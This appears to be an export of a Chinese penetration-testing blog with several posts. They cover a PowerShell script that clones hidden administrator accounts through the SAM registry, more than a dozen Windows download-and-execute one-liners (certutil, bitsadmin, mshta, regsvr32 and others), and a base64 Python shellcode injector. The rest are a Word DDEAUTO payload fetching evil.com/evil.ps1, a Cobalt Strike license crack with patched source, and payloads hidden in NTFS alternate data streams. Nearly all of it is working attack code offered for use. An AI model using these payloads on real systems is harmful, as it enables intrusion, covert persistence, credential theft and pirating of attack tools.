cmd /c " echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user [1 17] &gt;&gt; $env:temp\$user.ini" cmd /c "regini $env:temp\$user.ini" Remove-Item $env:temp\$user.ini if(Test-Path -Path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$user")&#123; cmd /c "regedit /e $env:temp\$user.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user"" $file = Get-Content "$env:temp\$user.reg" | Out-String $pattern="@=hex\((.*?)\)\:" $file -match $pattern |Out-Null $key = "00000"+$matches[1] Write-Host "[!]"$key return $key &#125;else &#123; Write-Host "[-] SomeThing Wrong !" &#125; &#125; function Clone ([string]$ukey,[string]$cukey) &#123; "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey [1 17] "| Out-File $env:temp\f.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$cukey [1 17] " | Out-File $env:temp\f.ini cmd /c " regini $env:temp\f.ini" Remove-Item $env:temp\f.ini $ureg = "HKLM:\SAM\SAM\Domains\Account\Users\$ukey" |Out-String $cureg = "HKLM:\SAM\SAM\Domains\Account\Users\$cukey" |Out-String Write-Host "[*] Get clone user'F value" $cuFreg = Get-Item -Path $cureg.Trim() $cuFvalue = $cuFreg.GetValue('F') Write-Host "[*] Change user'F value" Set-ItemProperty -path $ureg.Trim() -Name "F" -value $cuFvalue $outreg = "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey" cmd /c "regedit /e $env:temp\out.reg $outreg.Trim()" &#125; function Main () &#123; if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) &#123; Write-Output "Script must be run as administrator" break &#125; Write-Output "[*] Start" Write-Output "[*] Tring to change reg privilege !" upReg if( !(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$cu"))&#123; Write-Host "[-] The User to Clone does not exist !" Write-Output "[*] Change reg privilege back !" downReg Write-Output "[*] Exiting !" &#125; else &#123; if(!(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$u"))&#123; $tmp = "1" &#125; else&#123; $tmp = "0" &#125; Write-Output "[*] Create User..." Create-user $u $p Write-Output "[*] Get User $u's Key .." $ukey = GetUser-Key $u |Out-String Write-Output "[*] Get User $cu's Key .." $cukey = GetUser-Key $cu |Out-String Write-Output "[*] Clone User.." Clone $ukey $cukey if($tmp -eq 1 )&#123; Write-Output "[*] Delete User.." cmd /c "net User $u /del " |Out-Null &#125;else&#123; Write-Output "[*] Don't need to delete.."&#125; cmd /c "regedit /s $env:temp\$u.reg" cmd /c "regedit /s $env:temp\out.reg" Remove-Item $env:temp\*.reg Write-Output "[*] Change reg privilege back !" downreg Write-Output "[*] Done" &#125; &#125; Main&#125; GIT : Pentest 新建账号以后，可成功登陆系统 在Win7上做的测试如下： demo 当然可以配合这个姿势来实现多用户登陆。 使用mimikatz.exe,执行ts::multirdp允许多用户远程登录 ps:该方法在系统重启后失效，下次使用需要重新执行命令ts::multirdp,也可通过修改文件termsrv.dll实现永久修改 最后是远程执行的方式：1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u demo$ -p test123]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows命令执行漏洞不会玩？ 看我！]]></title>
    <url>%2Farchives%2Fremote_exec.html</url>
    <content type="text"><![CDATA[经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg:1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz 2、regsvr32eg:1regsvr32 /u /s /i:http://site.com/js.png scrobj.dll js.png123456789101112131415&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ ps = "cmd.exe /c calc.exe"; new ActiveXObject("WScript.Shell").Run(ps,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 3、rundll32eg:1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;% 细节：看我 4、mshtaeg:121） mshta http://site.com/calc.hta2） mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")")) calc.hta123456789101112131415&lt;HTML&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;&lt;HEAD&gt; &lt;script language="VBScript"&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject("Wscript.Shell")objShell.Run "calc.exe"self.close&lt;/script&gt;&lt;body&gt;demo&lt;/body&gt;&lt;/HEAD&gt; &lt;/HTML&gt; 5、pubprn.vbseg:1cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct 6、bitsadmineg:1cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe 7、python（需安装）eg:1python -c "import urllib2; exec urllib2.urlopen('http://site.com/abc').read();" abc1import base64; exec base64.b64decode("aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==") 8、certutileg:1certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete 9、msiexec1msiexec /q /i http://site.com/payloads/calc.png calc.png1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png 10、msxsl.exe(需下载)eg:1msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl demo.xml1234567&lt;?xml version="1.0"?&gt;&lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?&gt;&lt;customers&gt;&lt;customer&gt;&lt;name&gt;Microsoft&lt;/name&gt;&lt;/customer&gt;&lt;/customers&gt; exec.xsl1234567891011121314151617&lt;?xml version='1.0'?&gt;&lt;xsl:stylesheet version="1.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"xmlns:msxsl="urn:schemas-microsoft-com:xslt"xmlns:user="http://mycompany.com/mynamespace"&gt; &lt;msxsl:script language="JScript" implements-prefix="user"&gt; function xml(nodelist) &#123;var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe"); return nodelist.nextNode().xml; &#125;&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="user:xml(.)"/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; 11、IEExeceg:12C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s offC:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe 细节：戳我 12、IEXPLORE.EXE这个需要IE存在可执行命令的漏洞eg:1"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://site.com/exp exp可以使用类似ms14_064 13、当使用UNC/WebDAV时候多的几种姿势Cmd1cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt Cscript/Wscript1cscript //E:jscript \\webdavserver\folder\payload.txt Regasm/Regsvc1C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll dll 可以使用C#写的 Msbuild1cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml" pcalua.exe1pcalua.exe -a \\server\payload.dll 方式应该还有很多，欢迎留言补充！！]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSWord Code Exec Without Macro]]></title>
    <url>%2Farchives%2FMSWord_Code_Exec_Without_Macro.html</url>
    <content type="text"><![CDATA[今天学到了一个新的Word执行代码的方式，也是不需要启用宏的，所以分享给大家一波。操作也挺简单的。首先新建一个word文档，然后插入域： 选择 = (Formula) 右键，切换域代码 代码处修改为：1&#123;DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" &#125; 之后，右键更新域，再把文档改成docx格式即可。最终效果如下： 比较鸡肋的是点是以后才会执行。 除了使用DDEAUTO，使用DDE也是可以的，具体如下：1&#123;DDE "c:\\windows\\system32\\cmd.exe" "/c notepad" &#125; 需要注意的是，使用DDE不会自动执行，需要对文档进行修改，将文档重命名为rar，打开以后修改 word/settings.xml,添加1&lt;w:updateFields w:val="true"/&gt; 使用DDE效果如下： 个人感觉使用DDE效果更好点。 如何获取交互式shell ？ 1&#123; DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evil.com/evil.ps1');powershell -e $e "&#125;]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike3.8 破解版]]></title>
    <url>%2Farchives%2FCobaltStrike_3_8_Cracked-html.html</url>
    <content type="text"><![CDATA[之前一直想下载3.8，但是没下载到，看到小伙伴留言发了一个试用版的链接（安全性未知）。链接：戳我 然后就下载了一下,发现这个并不是破解版。如下图: 所以就对其进行了简单的修改，并把方法分享给大家，以便大家使用。首先，对cobaltstrike.jar进行解压，解压以后找到common\License.class,使用jad进行反编译。12C:\Users\evi1cg\Desktop\jad&gt;jad License.classParsing License.class... Generating License.jad 之后编辑License.jad文件，修改以下参数。找到life,修改为65535L: 之后将License.jad重命名为License.java，置于解压以后的CobaltStrike的根目录，之后使用javac进行编译。1javac -classpath . License.java 编译以后得到License.class，使用winrar打开未解压的CobaltStrike，使用修改后的License.class替换原来的License.class即可。 如果不想打开的时候弹框，可使用以下License.java进行编译12345678910111213141516171819202122232425262728293031323334353637383940414243444546package common;import aggressor.Prefs;public class License&#123; public License() &#123; &#125; private static long getTimeSinceStart() &#123; Prefs prefs = Prefs.getPreferences(); today = System.currentTimeMillis(); start = prefs.getLongNumber("cobaltstrike.start.int", 0L); if(start == 0L) &#123; prefs.set("cobaltstrike.start.int", (new StringBuilder()).append("").append(today).append("").toString()); prefs.save(); start = today; &#125; difference = (today - start) / 0x5265c00L; return difference; &#125; public static void checkLicenseGUI() &#123; getTimeSinceStart(); &#125; public static boolean isTrial() &#123; return true; &#125; public static void checkLicenseConsole() &#123; &#125; private static long life = 65535L; private static long today = 0L; private static long start = 0L; private static long difference = 0L;&#125; 在这里有个坑，参照这个文章进行破解是有问题的，他直接修改了common.License.isTrial()的返回值为flase。123456public static boolean isTrial() &#123; return true; // 必须修改函数 // return false; //edit here &#125; 导致在ArtifactUtils类中处理函数XorEncode直接走向payload的Encode。12345678910111213141516171819202122232425public static byte[] XorEncode(byte data[], String arch)&#123; if(License.isTrial()) &#123; CommonUtils.print_trial((new StringBuilder()).append("Disabled ").append(arch).append(" payload stage encoding.").toString()); return data; &#125; AssertUtils.Test(data.length &gt; 16384, "XorEncode used on a stager (or some other small thing)"); AssertUtils.TestArch(arch); if("x86".equals(arch)) &#123; byte decoder[] = CommonUtils.pickOption("resources/xor.bin"); byte payload[] = XorEncoder.encode(data); return CommonUtils.join(decoder, payload); &#125; if("x64".equals(arch)) &#123; byte decoder[] = CommonUtils.readResource("resources/xor64.bin"); byte payload[] = XorEncoder.encode(data); return CommonUtils.join(decoder, payload); &#125; else &#123; return new byte[0]; &#125;&#125; 但是由于试用版不存在xor.bin以及xor64.bin,所以会导致无法创建监听。所以我们还是只改时间好了。然后我们的cs就可以使用了，缺点就是不能加密payload。 修改版下载链接: 链接: 戳我 密码: 86f3 安全性请自行验证！！]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透中的ADS]]></title>
    <url>%2Farchives%2FADS.html</url>
    <content type="text"><![CDATA[为了测试，在这里使用Cobaltstrike 生成一个exe，用来查看文件是否上传成功，并可以顺利执行，每次上传文件以后，服务器自动删除，如下图： PS: meterpreter会话是通过powershell web_delivery获取的 尝试创建文件夹成功： 将文件上传至特殊目录：1upload /tmp/beacon.exe \\\\.\\c:\\WINDOWS\\debug\\WIA\\123:aa.exe upload /tmp/beacon.exe 123:aa.exe也可以，这是写到了当前目录。 上传以后进入shell 可使用 dir /r来查看 可以看到成功写入了，之后使用WMIC来执行，命令如下：12wmic process call create \\.\c:\WINDOWS\debug\WIA\123:aa.exewmic process call create C:\WINDOWS\debug\WIA\123:aa.exe //当前目录使用，需要绝对路径 也可以使用msf来执行1execute -cH -f "\\\\.\\c:\\WINDOWS\\debug\\WIA\\123:aa.exe" 到cobal里面可以看到会话。 如果有权限的话，可使用certutil下载文件到ADS1certutil -urlcache -split -f http://url/test.exe \\.\c:\WINDOWS\debug\WIA\123:aa.exe 删除certutil缓存1certutil.exe -urlcache -split -f http://url/test.exe delete 测试时发现一个有趣的东西，使用test： 使用nul 测试发现，如果想要dir /s 里面看不到ADS，可以使用的文件为：12345\\.\C:\test\COM1\\.\C:\test\COM2...\\.\C:\test\COM9\\.\C:\test\nul 并且这些文件是不可以直接删除的，要删除的话使用如下命令：1del \\.\C:\test\nul 再分享一下怎么样带参数执行ADS文件，其实可以借助于MSF，具体命令如下1execute -iH -f "c:\\文件路径\\123:1.exe" -a "文件参数" 效果如下图： 使用msf删除ADS，可直接使用rm 加绝对路径即可，如下图：]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>ads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Some Tricks]]></title>
    <url>%2Farchives%2FTricks.html</url>
    <content type="text"><![CDATA[远程执行sct的另一种姿势 1cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct detail：https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd 命令行下载姿势1123bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zipbitsadmin /rawreturn /transfer getpayload http://download.sysinternals.com/files/PSTools.zip c:\p.zipbitsadmin /transfer myDownLoadJob /download /priority normal "http://download.sysinternals.com/files/PSTools.zip" "c:\p.zip" 命令行下载姿势21certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt 清除缓存 certutil -urlcache -split -f http://192.168.254.102:80/a.txt delete 命令行执行远程JS1certutil -urlcache -split -f http://192.168.254.102:80/a a.js &amp;&amp; cscript a.js &amp;&amp; del a.js &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete 命令行远程执行VBS1certutil -urlcache -split -f http://192.168.254.102:80/abc a.vbs &amp;&amp; cscript a.vbs &amp;&amp; del a.vbs &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/abc delete 命令行远程执行HTA1mshta http://192.168.254.102/1.hta]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[powershell 通过IE下载文件]]></title>
    <url>%2Farchives%2FDownloader_byIE.html</url>
